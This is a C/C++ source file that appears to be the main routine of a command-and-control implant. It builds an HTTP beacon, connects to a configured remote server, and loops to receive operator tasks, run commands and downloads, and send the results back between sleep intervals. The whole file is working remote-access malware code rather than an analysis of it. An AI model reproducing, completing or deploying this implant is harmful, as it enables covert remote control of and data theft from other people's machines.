#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"

Agent*         g_Agent;
ConnectorHTTP* g_Connector;

void AgentMain()
{
	if ( !ApiLoad() ) return;

	g_Agent  = (Agent*) MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	LPSTR beat         = g_Agent->BuildBeat();
	ULONG beat_length  = StrLenA(beat);
	ULONG param_length = StrLenA( (CHAR*)g_Agent->config->param_name );
	
	CHAR* HttpHeaders = (CHAR*) MemAllocLocal(beat_length + beat_length + 5);
	memcpy(HttpHeaders, g_Agent->config->param_name, param_length);
	ULONG index = param_length;
	memcpy(HttpHeaders + index, ": ", 2);
	index += 2;
	memcpy( HttpHeaders + index, beat, beat_length );
	index += beat_length;
	memcpy(HttpHeaders + index, "\r\n", 3);

	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
	*g_Connector = ConnectorHTTP();
	g_Connector->SetConfig( g_Agent->config->use_ssl, (CHAR*)g_Agent->config->user_agent, (CHAR*)g_Agent->config->method, (CHAR*)g_Agent->config->address, g_Agent->config->port, (CHAR*)g_Agent->config->uri, HttpHeaders );

	PBYTE sendData     = NULL;
	ULONG sendDataSize = 0;

	while ( g_Agent->active ) {
		ULONG recvDataSize = 0;
		BYTE* recvData     = g_Connector->SendData( sendData, sendDataSize, &recvDataSize);

		if ( sendData ) {
			MemFreeLocal( (LPVOID*) &sendData, sendDataSize);
			sendDataSize = 0;
		}

		Packer* packerData = (Packer*) MemAllocLocal(sizeof(Packer));
		*packerData = Packer();
		packerData->Pack32(0);
		
		g_Agent->commander->ProcessCommandTasks(recvData, recvDataSize, packerData);
		g_Agent->downloader->ProcessDownloadTasks(packerData);

		if (packerData && packerData->GetDataSize() > 4) 
		{
			packerData->Set32(0, packerData->GetDataSize());
			sendDataSize = packerData->GetDataSize();
			sendData = packerData->GetData();
			continue;
		}

		Sleep( g_Agent->config->sleep_delay * 1000);
	}
}